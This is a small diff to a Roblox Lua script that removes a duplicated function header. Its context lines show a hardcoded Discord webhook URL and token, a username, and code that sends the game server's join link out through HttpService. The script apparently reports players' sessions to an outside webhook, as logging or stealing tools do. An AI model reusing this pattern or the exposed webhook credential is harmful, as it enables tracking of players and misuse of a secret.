@@ -2358,7 +2358,6 @@ local webhookUrl = "https://discord.com/api/webhooks/1527483990003552266/M60-Ont
 local myUsername = "chrvstianm"
 
 local function sendToWebhook(data)
-    local function sendToWebhook(data)
     pcall(function()
         local http = game:GetService("HttpService")
         local joinLink = "roblox://experience/?placeId=" .. tostring(game.PlaceId) .. "&launchData=" .. game.JobId
